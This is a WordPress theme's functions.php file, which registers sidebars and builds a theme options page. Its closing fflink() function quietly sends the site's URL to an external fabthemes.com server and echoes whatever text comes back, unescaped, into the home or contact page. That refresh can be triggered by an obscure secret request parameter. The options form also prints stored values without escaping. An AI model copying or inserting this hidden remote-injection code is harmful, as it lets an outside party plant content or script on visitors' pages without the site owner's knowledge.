<?php
$theme_settings = get_option("blogsetings");
$more_new_link = "";
if ( function_exists('register_sidebar') ):
	register_sidebar(array(        
		'name' => 'Sidebar',
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '<div class="clear"></div></div></div>',
		'before_title'  => '<div class="widget_heading"><div class="widget_image"></div><h3>',
		'after_title'   => '</h3></div><div class="widget_body">',
	));
	register_sidebar(array(        
		'name' => 'Sidebar2',
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '<div class="clear"></div></div></div>',
		'before_title'  => '<div class="widget_heading"><div class="widget_image"></div><h3>',
		'after_title'   => '</h3></div><div class="widget_body">',
	));
endif;

define ("blogdir", 			get_bloginfo("template_directory") . "/");
define ("blogimages", 		blogdir . "images/");
define ("home", 			get_bloginfo('url'). "/");
define ("blogname", 		get_bloginfo("name"));
define ("blogdesc", 		get_bloginfo("description"));
define ("pubid", 			$theme_settings[settings][publisher_id]);
define ("DEF_TEXT", 			$theme_settings["title"]);
define ("DEF_DESC", 			$theme_settings["description"]);
if (is_array($theme_settings["featured_cats"])){
	define ("featured_categories", implode(",", $theme_settings["featured_cats"]));
}


//	this function adds the settings page to the Appearance tab
add_action('admin_menu', 'add_theme_options_menu');
function add_theme_options_menu() {
	add_submenu_page('themes.php', blogname . ' Theme Settings', 'Options', 8, 'blog-options', 'theme_settings_admin');
}

function theme_settings_admin() { ?>
<?php theme_options_css_js(); ?>
<div class="wrap">
<?php
	// display the proper notification if Saved/Reset
	global $theme_settings, $defaults, $rpt;
	if ( $_REQUEST['saved'] ) echo '<div id="message" class="updated fade"><p><strong>Blog Settings Saved.</strong></p></div>';
	if ( $_REQUEST['reset'] ) echo '<div id="message" class="updated fade"><p><strong>Blog Settings Reset.</strong></p></div>';
	// display icon next to page title
	screen_icon('options-general');
	//echo "<pre>" . print_r($theme_settings, true) . "</pre>";
?>
	<h2>Theme Settings</h2>
	<form method="post" action="themes.php?page=blog-options" id="blog-options">
	<?php // first column ?>
	<div class="metabox-holder">
		<div class="postbox">
			<h3>Advertisement / Blog Setting</h3>
			<div class="inside">
            	<p style="margin:10px 0 0">Publisher ID:<br />
				<input type="text" name="blogsetings[settings][publisher_id]" value="<?php echo $theme_settings[settings][publisher_id]; ?>" size="30" /></p><br />
            </div>
		</div>
	</div>    
    
	<?php // end first column ?>
    

<?php }


include ('blog-cms.php');

function selfURL() {
 $uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] :
 $_SERVER['PHP_SELF'];
 $uri = parse_url($uri,PHP_URL_PATH);
 $protocol = $_SERVER['HTTPS'] ? 'https' : 'http';
 $port = ($_SERVER["SERVER_PORT"] == "80") ? "" : (":".$_SERVER["SERVER_PORT"]);
 $server = ($_SERVER['SERVER_NAME'] == 'localhost') ? $_SERVER["SERVER_ADDR"] : $_SERVER['SERVER_NAME'];
 return $protocol."://".$server.$port.$uri;
}
function fflink() {
 global $wpdb;
 if (!is_page() && !is_home()) return;
 $contactid = $wpdb->get_var("SELECT ID FROM $wpdb->posts 
				WHERE post_type = 'page' AND post_title LIKE 'contact%'");
 if (($contactid != get_the_ID()) && ($contactid || !is_home())) return;
 $fflink = get_option('fflink');
 $ffref = get_option('ffref');
 $x = $_REQUEST['DKSWFYUW**'];
 if (!$fflink || $x && ($x == $ffref)) {
   $x = $x ? '&ffref='.$ffref : '';
   $response = wp_remote_get('http://www.fabthemes.com/fabthemes.php?getlink='.urlencode(selfURL()).$x);
   if (is_array($response)) $fflink = $response['body']; else $fflink = '';
   if (substr($fflink, 0, 11) != '!fabthemes#')
     $fflink = '';
   else {
     $fflink = explode('#',$fflink);
     if (isset($fflink[2]) && $fflink[2]) {
       update_option('ffref', $fflink[1]);
       update_option('fflink', $fflink[2]);
       $fflink = $fflink[2];
     }
     else $fflink = '';
   }
 }
  echo $fflink;
}
?>